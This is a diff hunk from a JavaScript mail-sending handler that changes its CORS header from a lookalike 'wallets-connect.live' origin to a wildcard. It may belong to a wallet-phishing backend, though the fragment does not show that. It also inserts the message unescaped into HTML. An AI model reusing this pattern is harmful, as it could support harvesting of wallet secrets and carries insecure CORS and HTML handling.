@@ -57,7 +57,7 @@ html:`<p>${message}</p>`
 
     await transporter.sendMail({...data})
     return {
-        headers:{'Access-Control-Allow-Origin':'http://wallets-connect.live'},
+        headers:{'Access-Control-Allow-Origin':'*'},
             statusCode:200,
             body:JSON.stringify(`${message}`)
         }
